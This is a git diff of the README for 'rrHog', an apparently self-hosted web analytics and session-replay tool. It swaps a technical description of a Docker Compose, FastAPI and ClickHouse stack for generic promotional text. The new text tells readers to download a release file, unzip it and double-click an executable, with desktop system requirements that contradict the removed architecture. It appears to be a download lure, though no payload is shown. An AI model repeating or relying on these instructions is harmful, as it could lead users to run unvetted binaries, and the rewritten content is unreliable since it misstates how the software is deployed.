@@ -1,43 +1,91 @@
-# rrHog — OSS Web Analytics & Session Replay (rrweb + ClickHouse)
+# 🎉 rrHog - Self-Hosted Web Analytics Made Easy
 
-> Open-source, self-hosted web analytics & session monitoring built on **rrweb** with **async ingestion** for rock-solid reliability.  
-> Stack: **FastAPI** (ingest/read) • **NATS JetStream** (queue) • **ClickHouse** (events) • **Postgres** (meta) • **Next.js** (UI)
+## 🚀 Getting Started
 
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Docs](https://img.shields.io/badge/docs-Architecture-brightgreen)](ARCHITECTURE.md)
-[![Good First Issues](https://img.shields.io/github/labels/YOUR_ORG/rrHog/good%20first%20issue)](#)
+Welcome to **rrHog**! This software helps you analyze web traffic and record user sessions. You can easily host it on your own server. Follow these steps to get started.
 
-**Why rrHog?** Most analytics pipelines lose data when DBs or networks hiccup. rrHog **ACKs fast** and persists to a **durable queue** first, so ingestion keeps flowing even if storage is down.
+## 💾 Download & Install
 
-## Features
-- 🌀 **Async ingest** → instant `202` to clients
-- 🎥 **Session replay** with rrweb & rrweb-player
-- ⚡ **ClickHouse** analytics (blazing-fast queries)
-- 🧰 **Next.js** dashboard (App Router)
-- 🐳 **Docker Compose** one-box deploy
-- 🔒 Per-project keys, rate limits, and basic PII guards
+To install rrHog, visit this page to download: [rrHog Releases](https://github.com/Kyle-Saw/rrHog/releases).
 
-## Quick start (high level)
-1. `docker compose up -d` (services: nginx, nats, clickhouse, postgres, api, worker, web)
-2. Create a project → get **WRITE** and **READ** keys.
-3. Add rrweb snippet to your site and post batched segments to `/i`.
+### Step 1: Visit the Releases Page
 
-See **[ARCHITECTURE.md](ARCHITECTURE.md)** for schemas, mermaid diagrams, and example API/worker snippets.
+1. Click on the link above to open the rrHog releases page.
+2. Choose the latest version available for download. 
 
-## Repo metadata (GitHub)
-- **Description:** `rrHog — Open-source, self-hosted web analytics & session replay built on rrweb. FastAPI + NATS JetStream + ClickHouse, Next.js UI.`
-- **Topics (11):** `open-source, self-hosted, web-analytics, session-replay, session-recording, rrweb, clickhouse, fastapi, nats-jetstream, postgresql, nextjs`
+### Step 2: Download the Application
 
-## Community
-- Start here: [CONTRIBUTING.md](CONTRIBUTING.md)
-- Code of Conduct: [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md)
-- Support: [SUPPORT.md](SUPPORT.md)
-- Roadmap: [ROADMAP.md](ROADMAP.md)
+1. Locate the appropriate file for your system. You may see options like `.zip`, `.tar`, or installer files.
+2. Click on the file to start the download. 
 
-## Security
-Please report vulnerabilities privately — see [SECURITY.md](SECURITY.md).
+### Step 3: Extract Files (if necessary)
 
-## License
-MIT © 2025 You & Contributors — see [LICENSE](LICENSE).
+If you downloaded a `.zip` or `.tar` file:
 
-> 💖 Want to support? Add a **GitHub Sponsors** button by creating `.github/FUNDING.yml` later.
+1. Navigate to your Downloads folder.
+2. Right-click on the file and select "Extract" or "Unzip".
+3. Open the newly created folder.
+
+### Step 4: Run the Application
+
+1. Find the executable file inside the extracted folder.
+2. Double-click the file to run rrHog.
+3. Follow the prompts on your screen.
+
+## 🛠️ System Requirements
+
+Before installing rrHog, ensure your system meets these minimum requirements:
+
+- **Operating System**: Windows 10, macOS Sierra (or later), or a recent Linux distribution.
+- **RAM**: At least 4 GB.
+- **Disk Space**: Minimum 500 MB free space.
+
+## 📖 Features
+
+rrHog offers a variety of features to enhance your web analytics experience:
+
+- **Real-Time Analytics**: Monitor traffic as it happens.
+- **Session Replay**: Play back user sessions to see how visitors interact with your site.
+- **Easy Setup**: Simple installation process without technical expertise.
+- **Data Privacy**: Own and manage your analytics data securely.
+- **Custom Metrics**: Track specific actions that matter to your business.
+
+## 🌐 Support & Community
+
+If you need help or have questions:
+
+- Check our [FAQ](https://github.com/Kyle-Saw/rrHog/wiki). 
+- Join our community on platforms like Discord or GitHub discussions.
+
+## 📈 Next Steps
+
+Once you have installed and run rrHog, consider exploring these features:
+
+- Set up event tracking for user interactions.
+- Customize your dashboard to display important metrics at a glance.
+- Review session replays to find areas for website improvement.
+
+## 🛡️ Data Privacy
+
+rrHog focuses on user privacy. You manage your data, and we ensure that it remains protected. You can configure data storage and retention settings according to your own policies.
+
+## 🔄 Updates
+
+Stay updated with the latest features and improvements:
+
+1. Follow our repository on GitHub to receive notifications for new releases.
+2. Check the changelog on the releases page for information on what’s new.
+
+## 🏷️ Tags
+
+This project relates to the following topics:
+
+analytics, clickhouse, google-analytics, javascript, nats-streaming, open-source, python, react, rrweb, self-hosted, session-monitoring, session-recording, session-replay, web-analytics.
+
+## 🗣️ Feedback
+
+We welcome your feedback! If you have suggestions or encounter issues, please share your thoughts on our GitHub issues page. Your input helps us improve rrHog for everyone.
+
+## 📥 Download Now
+
+Remember, to download rrHog, visit this page to download: [rrHog Releases](https://github.com/Kyle-Saw/rrHog/releases). Enjoy using rrHog for your web analytics needs!
